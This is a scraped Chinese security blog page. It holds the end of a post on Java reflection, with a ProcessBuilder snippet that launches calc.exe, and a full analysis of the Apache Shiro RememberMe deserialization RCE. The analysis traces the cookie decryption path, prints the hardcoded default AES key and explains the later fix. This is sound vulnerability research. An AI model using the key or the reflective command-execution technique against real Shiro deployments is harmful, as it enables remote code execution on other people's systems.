<h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>​        我们再试试通过ProcessBuilder来执行系统命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">Constructor con &#x3D; test666.getConstructor(List.class);</span><br><span class="line">Object o&#x3D;con.newInstance(Arrays.asList(&quot;calc.exe&quot;));</span><br><span class="line">Method method &#x3D; test666.getMethod(&quot;start&quot;);</span><br><span class="line">Object result &#x3D; method.invoke(o);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        这里需要注意，由于ProcessBuilder没有无参构造器，所以在调用构造方法的时候需要传递需要的参数类型，创建实例的时候也需要传入参数，但是调用start方法的时候无需传入参数，由于ProcessBuilder的构造方法是public类型，因此无需设置访问权限。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203144932128.png" alt="image-20201203144932128"></p>
<p>​        当然ProcessBuilder的构造方法不止这一个，还有一个重载的方法</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203145832898.png" alt="image-20201203145832898"></p>
<p>​        下面我们学习一下如何通过反射调用这个方法，这里面使用了的参数是变长参数，对于边长参数，我们也可以当数组来处理，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152347974.png" alt="image-20201203152347974"></p>
<p>​        所以我们获取这个构造方法时可以这样<code>getConstructor(String[].class)</code> </p>
<p>当我们通过<code>newInstance</code>来创建实例时，由于newInstance这个函数也是可变参数，所以可以使用两层数组来引用<code>new String[][]calc.exe</code>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152629453.png" alt="image-20201203152629453"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152723799.png" alt="image-20201203152723799"></p>
<p>​        由于newInstance接收的可变参数是Object类型，因此可以通过<code>(Object)new String[]{&quot;calc.exe&quot;}</code>来创建实例。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203153631825.png" alt="image-20201203153631825"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">shiro rce漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-28 22:07:45" itemprop="dateCreated datePublished" datetime="2020-11-28T22:07:45+08:00">2020-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 10:04:49" itemprop="dateModified" datetime="2020-12-24T10:04:49+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在最近这几年，我们在渗透的过程中经常会用到shiro的rce漏洞来打点，直到目前为止还经常会在一些项目或者HW中也会经常遇到shrio的rce，因此了解shiro的RememberMe反序列化导致的命令执行漏洞的原理是至关重要的，在本次分享中，我将和大家一起学习shiro RememberMe反序列化漏洞。</span><br></pre></td></tr></table></figure>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​    我这里选择网上已经有人搭建好的漏洞环境来搭建环境<code>https://github.com/potats0/ShiroDemo</code>，下载好项目以后使用IDEA导入pom.xml文件，由于我这里使用的MAVEN是阿里云镜像，我使用shiro-core为1.2.4时提示我找不到包，因此我这里使用的是1.2.2版本。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221450755.png" alt="image-20201128221450755"></p>
<p>​    需要的包导入后，找到App.java文件，通过调试来运行。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221552395.png" alt="image-20201128221552395"></p>
<p>​    运行成功后界面如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221658967.png" alt="image-20201128221658967"></p>
<h3 id="Shiro基本知识"><a href="#Shiro基本知识" class="headerlink" title="Shiro基本知识"></a>Shiro基本知识</h3><p>​    我们知道，shiro是一款用来进行权限认证和权限管理的框架，可以帮我们完成认证、授权、加密、会话管理、与Web集成、缓存等功能。</p>
<p>​    下面我结合着这个漏洞环境的代码带大家一起学习一下shiro的基本知识。</p>
<p>​    在这个项目的源码文件中，主要包含了4个文件，APP.java内容为启动springboot的内容，这里不做解释了，看下其他文件的内容，首先是MainRealm.java，在介绍这个文件的内容前，我们先了解几个基本的概念。</p>
<p>​    我们知道，shiro框架的一个主要的功能是用来做身份认证的，在shiro中，主要通过principals （身份）和 credentials（证明）一起来验证用户的身份。</p>
<h4 id="principals"><a href="#principals" class="headerlink" title="principals"></a><strong>principals</strong></h4><p>​    指用户身份的标识，可以是用户的用户名，手机号等等，但需要确保其唯一性。</p>
<h4 id="credentials"><a href="#credentials" class="headerlink" title="credentials"></a><strong>credentials</strong></h4><p>​    凭证，一般来说就是密码。</p>
<h4 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a><strong>Realm</strong></h4><p>​    域，shiro会从Realm中获取安全数据（用户，角色，权限），当SecurityManager要身份认证，需要从Realm中来确定用户身份以及用户可以访问的权限。</p>
<p>​    在shiro中，SecurityManager负责身份认证的逻辑，它会委托给Authenticator进行身份认证，Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问。</p>
<p><strong>AuthorizingRealm</strong></p>
<p>​    在shiro中，默认提供了一些Realm，他们的继承关系如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="img"> </p>
<p>​    CachingRealm是带缓存的Realm，里面包含了多个CacheManager属性，具体的缓存在其子类中进行实现。</p>
<p>​    AuthenticatingRealm是带认证的Realm,该类实现了认证的基本逻辑和缓存逻辑。</p>
<p>​    AuthorizingRealm主要用来鉴权和获取授权信息的Realm,该类实现了Authorizer，所以可以做鉴权。也实现了PermissionResolverAware，RolePermissionResolverAware因此可以对用户的访问权限做判断。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129131100239.png" alt="image-20201129131100239"></p>
<p>​    在shiro认证过程中，依赖AuthenticatingRealm的getAuthenticationInfo方法，getAuthenticationInfo会调用我们自定义的doGetAuthenticationInfo方法获取认证的结果。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129132011123.png" alt="image-20201129132011123"></p>
<p>​    在登录的时候需要将数据封装到<code>Shiro</code>的一个<code>token</code>中，执行shiro的<code>login()</code>方法，<code>Shiro</code>就会自动的调用<code>doGetAuthenticationInfo(AuthenticationToken token)</code>方法获取身份认证信息，在本次环境中，首先通过token.getPrincipal()方法获取username信息，通过authenticationToken.getCredentials()获取密码信息，对用户的用户名和密码进行判断，如果用户用户名为admin,密码为vulhub，认证成功则返回SimpleAuthenticationInfo对象,mainrealm.java的代码如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129122749329.png" alt="image-20201129122749329"></p>
<h4 id="shiro拦截器"><a href="#shiro拦截器" class="headerlink" title="shiro拦截器"></a><strong>shiro拦截器</strong></h4><p>​    在shiro中使用了与 Servlet 一样的 Filter 接口进行扩展，shiro拦截器的基础类及其继承关系如下：</p>
<p><img src="https://wiki.jikexueyuan.com/project/shiro/images/14.png" alt="img"></p>
<p>​    ShiroFilter是整个 Shiro 的入口点，用于拦截需要安全控制的请求进行处理，除了上面的基础拦截器类外，shiro还提供了一些比较常用的默认拦截器。</p>
<p>​    FormAuthenticationFilter登录拦截器，它主要有两个作用，一个是拦截登录表单提交的路径，创建登录认证所需要的Token令牌，并进入登录认证流程。另一个作用是拦截要求登录后才可以访问的路径，如果已经登录则直接进入到要访问路径，如果未登录则访问被拒绝并跳转到登录页。登录拦截器常用的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createToken创建认证令牌，令牌内存储了登录认证时所需的数据。</span><br><span class="line">onLoginSuccess设置登录成功后的行为。</span><br><span class="line">onAccessDenied设置被拒绝后的行为</span><br><span class="line">setLoginUrl设置登录地址</span><br><span class="line">getUsername获取登录名，表单name值必须是username。</span><br><span class="line">getPassword获取密码，表单name值必须是password。</span><br></pre></td></tr></table></figure>

<p>​    UserFilter用户拦截器，用户已经登录认证 或 已经记住我 的都可以通过。</p>
<p>​    AnonymousFilter无需认证即可通过。</p>
<h4 id="拦截器链"><a href="#拦截器链" class="headerlink" title="拦截器链"></a><strong>拦截器链</strong></h4><p>​    Shiro 对 Servlet 容器的 FilterChain 进行了代理，即 ShiroFilter 在继续 Servlet 容器的 Filter 链的执行之前，通过 ProxiedFilterChain 对 Servlet 容器的 FilterChain 进行了代理。当Filter执行的过程中，首先执行shiro的拦截器链，再经过Servlet容器的拦截器链。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143520958.png" alt="image-20201129143520958"></p>
<p>​    在shiro中提供了PathMatchingFilterChainResolver来判断请求的url和拦截器的规则是否匹配。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143926553.png" alt="image-20201129143926553"></p>
<p>​    DefaultFilterChainManager中维护者一个拦截器链，我们可以通过DefaultFilterChainManager中的方法添加拦截器。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129144850395.png" alt="image-20201129144850395"></p>
<h4 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a><strong>ShiroFilterFactoryBean</strong></h4><p>​    通过ShiroFilterFactoryBean类可以方便的配置拦截器的各种基本属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setSecurityManager:注入一个SecurityManager类，SecurityManager负责管理整个shiro核心验证功能。</span><br><span class="line">setLoginUrl：配置登录页路径。</span><br><span class="line">setSuccessUrl：配置登录成功页路径。</span><br><span class="line">setUnauthorizedUrl：配置没有权限跳转的页面。</span><br><span class="line">setFilterChainDefinitionMap：设置拦截规则。拦截规则是通过一个Map进行导入的。</span><br><span class="line">setFilters：用于注入自己实现的拦截器类。</span><br></pre></td></tr></table></figure>

<p>​    拦截规则是通过MAP来进行设置的，基本形式如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap &#x3D; new LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">filterChainDefinitionMap.put(&quot;&lt;拦截路径&gt;&quot;, &quot;&lt;拦截器名称&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>​    拦截器路径是一个从根路径开始的url，并支持通配符。拦截器名称既可以是shiro内置拦截器的名称比如anon(无需认证的拦截器)、authc（需要认证的拦截器）、user (已经登录成功或使用记住我的拦截器)，perms[role_name] - 需要权限验证的路径使用perms拦截器。中括号内为权限名称列表。</p>
<hr>
<p>​    接下来我们看一下shiroConfig.java，这个类是shiro的配置类，在这个类的shiroFilterFactoryBean中，通过setSecurityManager来设置securityManager，在securityManager中，设置了Realm为我们自己定义的mainRealm，RememberMeManager为cookieRememberMeManager，也就是cookie的”记住我”功能。通过setLoginUrl方法来设置未登录时需要认证的地址也就是登录地址。setUnauthorizedUrl方法来设置无权访问时跳转的地址。通过创建LinkedHashMap，设置map.put(“/doLogin”, “anon”)来设置不需要登录就能访问的地址。通过map.put(“/xxx/**”, “user”);来设置用户登录后才能访问的地址。最后通过setFilterChainDefinitionMap将这个map设置到FilterChain中。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129134331085.png" alt="image-20201129134331085"></p>
<h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a><strong>Subject</strong></h4><p>​    Shiro中认证授权组件Subject，为我们提供了当前用户、角色和授权的相关信息，可以进行登录，退出，权限验证，获取用户信息，session。</p>
<p>​    通过SecurityUtils.getSubject获取subject对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subject subject &#x3D; SecurityUtils.getSubject();</span><br></pre></td></tr></table></figure>

<p>​    subject包含如下主要接口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Subject login(Subject subject, AuthenticationToken authenticationToken) throws AuthenticationException;    &#x2F;&#x2F;登陆</span><br><span class="line">void logout(Subject subject);        &#x2F;&#x2F;退出登陆</span><br><span class="line">Subject createSubject(SubjectContext context);    &#x2F;&#x2F;获取subject</span><br><span class="line">Session session &#x3D; subject.getSession(); &#x2F;&#x2F;获取session对象</span><br><span class="line">String currentUser &#x3D; subject.getPrincipal().toString(); &#x2F;&#x2F;获取登录名</span><br></pre></td></tr></table></figure>

<p>​    了解了这些知识，我们看下UserController.java是如何实现的，通过SecurityUtils.getSubject方法获取subject对象，通过login来进行登录，传入的参数为UsernamePasswordToken对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129153131427.png" alt="image-20201129153131427"></p>
<p>​    这里，shiro的基础知识我们大概了解了一些了，下面我们再看一下漏洞。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    因为之前已经有人分析过shiro的反序列化漏洞了，并且在文章中给出了存在反序列化漏洞的方法，在DefaultSerializer类的deserialize方法中，因此我们可以直接找到这个方法并打上断点 。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130114316497.png" alt="image-20201130114316497"></p>
<p>​    在这个函数中调用了ObjectInputStream类的readObject方法来进行反序列化操作，下面是整个过程的调用栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">deserialize:75, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:846, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:93, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:526, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:92, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:367, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:860, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1591, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>​    下面我们分析一下这个漏洞的调用过程，再调用的过程中，我们可以看到拦截器的调用链，已经将shiroFilter写入到tomcat拦截器之前。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130155604254.png" alt="image-20201130155604254"></p>
<p>​    下面依次调用对应的拦截器，OrderedCharacterEncodingFilter–&gt;OrderedFormContentFilter–&gt;OrderedRequestContextFilter–&gt;ShiroFilterFactoryBean–&gt;WsFilter。</p>
<p>​    首先调用OrderedCharacterEncodingFilter设置编码</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161156440.png" alt="image-20201130161156440"></p>
<p>​    调用OrderedFormContentFilter获取参数，这里参数为空，因此会调用else中的代码。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161341690.png" alt="image-20201130161341690"></p>
<p>​    调用OrderedRequestContextFilter完成requestContext的初始化操作。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130162453138.png" alt="image-20201130162453138"></p>
<p>​    下来就是shiorFilter的调用链，再shior拦截器中调用了createSubject来创建subject对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163400707.png" alt="image-20201130163400707"></p>
<p>​    跟进createSubject方法，调用了buildWebSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163533846.png" alt="image-20201130163533846"></p>
<p>​    在 buildWebSubject中调用了其父类的buildSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163606923.png" alt="image-20201130163606923"></p>
<p>​    跟进父类的buildSubject方法，调用了DefaultSecurityManager的createSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165013406.png" alt="image-20201130165013406"></p>
<p>​    继续跟进，我们需要关注resolvePrincipals方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165132350.png" alt="image-20201130165132350"></p>
<p>​    跟进resolvePrincipals方法，判断RememberMeManager是否为空，不为空则调用getRememberedPrincipals。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170513136.png" alt="image-20201130170513136"></p>
<p>​    跟进getRememberedPrincipals方法，首先调用了getRememberedSerializedIdentity。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170719001.png" alt="image-20201130170719001"></p>
<p>​    跟进getRememberedSerializedIdentity方法，在该方法中，通过this.getCookie().readValue(request, response);获取了cookie的内容，并且判断是否为deleteMe，若为DeleteMe则返回null,否则将继续执行，对获取的cookie的内容进行base64解码并返回。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171245277.png" alt="image-20201130171245277"></p>
<p>​        返回后会判断获取的cookie的内容是否为空，如果不为空，则调用convertBytesToPrincipals方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171552207.png" alt="image-20201130171552207"></p>
<p>​    在convertBytesToPrincipals调用了decrypt对cookie的内容进行解密。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171453470.png" alt="image-20201130171453470"></p>
<p>​    在decrypt中，调用cipherService.decrypt进行解密，同时传入了this.getDecryptionCipherKey()的内容。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171804561.png" alt="image-20201130171804561"></p>
<p>​    我们看一下getDecryptionCipherKey中的key是如何来的，返回了当前对象的decryptionCipherKey属性。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171919629.png" alt="image-20201130171919629"></p>
<p>​    decryptionCipherKey是在setDecryptionCipherKey中设置的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172056694.png" alt="image-20201130172056694"></p>
<p>​    在setCipherKey中调用了setDecryptionCipherKey进行设置、</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172145175.png" alt="image-20201130172145175"></p>
<p>​    setCipherKey中的参数来自于DEFAULT_CIPHER_KEY_BYTES，而这个值是kPH+bIxk5D2deZiIxcaaaA== base64解密后的内容，所以这个key的内容在我们当前的环境下是写死的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172223454.png" alt="image-20201130172223454"></p>
<p>​    继续跟进解密算法，可以看到使用的解密方式是AES方式。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130173904974.png" alt="image-20201130173904974"></p>
<p>​    将解密后的结果返回后，再转换为字节数组的形式并返回。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174140275.png" alt="image-20201130174140275"></p>
<p>​    将返回的bytes作为参数传递到deserialize方法中。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174259064.png" alt="image-20201130174259064"></p>
<p>​    继续跟踪下面的调用</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174337766.png" alt="image-20201130174337766"></p>
<p>​    最终我们可以看到，将我们通过cookie传入的内容转换为ObjectInputStream,并调用了readObject进行反序列化操作。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174508646.png" alt="image-20201130174508646"></p>
<p>​    通过上面的分析，我相信我们已经对于shiro反序列化漏洞的基本原理有了大致的了解，这个漏洞要想正常的利用，至关重要的一点是找到解密cookie中传入payload的key，在这个环境中，key是写死的，实际上这个key也可以自己在shiorconfig类中配置加密的key。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180331183.png" alt="image-20201130180331183"></p>
<p>​    当我们更换key后，再去利用这个漏洞，由于key不正确无法解密导致无法继续利用。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180538186.png" alt="image-20201130180538186"></p>
<p>​    既然重新生成key这么简单，为什么还是有人使用默认的key或者网上公布的其他key？我们看一下这个key解密后的结果就知道了，由于这些key解密后都是一些乱码，不太容易编辑，所以可能很多人会去使用网上别人生成好的key，所以在漏洞利用的过程中有人想到了爆破key的方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180951079.png" alt="image-20201130180951079"></p>
<p>​    那如果想自己生成key,怎样生成才能满足要求呢,只要使用任意一个16位，24位，32位的字符串base64编码后都是可以作为key的。</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>​        我们尝试切换shiro为高版本，看一下shiro是如何修复反序列化漏洞的，我切换到1.2.7版本的shiro，我们可以看到在该版本中，key默认并不是写死的，而是由cipherService.generateNewKey().getEncoded()来生成的key。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164200537.png" alt="image-20201201164200537"></p>
<p>​    生成key的代码如下</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164541425.png" alt="image-20201201164541425"></p>
